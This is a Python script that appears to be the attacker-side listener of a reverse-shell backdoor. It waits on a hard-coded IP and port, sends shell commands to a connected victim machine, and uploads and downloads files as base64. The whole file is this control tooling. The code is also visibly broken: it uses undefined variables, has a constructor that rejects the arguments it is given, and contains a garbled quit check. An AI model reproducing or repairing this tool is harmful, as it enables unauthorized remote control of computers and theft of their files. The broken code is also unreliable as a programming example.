import socket
import base64
import simplejson

class SocketListener:
    def __init__(self):
        my_listener  = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        my_listener.bind((ip,port))
        my_listener.listen(0)
        print("I am listening , my man")
        (self.my_connection,my_adress)=my_listener.accept()
        print("OK connection"+ str(my_adress))

    def json_send(self,data):
        json_data=simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))

    def json_recive(self):
         json_data=""
         while True:
             try:
                json_data=json_data+self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
             except ValueError:
                continue
    
    def command_execution(self,command_input):
        self.json_send(command_input)
        
        if command_input == [0] =="quit":
            self.my_connection()
            exit()
       
        return json_recive()

    def save_file(self,file,content):
        with open(path,"wb") as my_file:
             my_file.write(base64.b64decode(content))
             return "Download successfully"
    def get_file_contents(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())

    def start_listener(self):
        while True:
            command_input=input("Enter command: ")
            command_input=command_input.split(" ")
            try:
                if command_input[0] == "upload":
                    my_file_content = self.get_file_contents(content_input[1])
                    command_input.append(my_file_content)


                command_output=self.command_execution(command_input)
            
                if command_input[0] == "mkdir" and "Error 404!" not in command_output:
                    command_output = self.save_file(command_input[1],command_output)
            except Exception:
               command_output="Error 404!"

            print(command_output)


my_socket_listener = SocketListener("172.20.10.13",8080)
my_socket_listener.start_listener()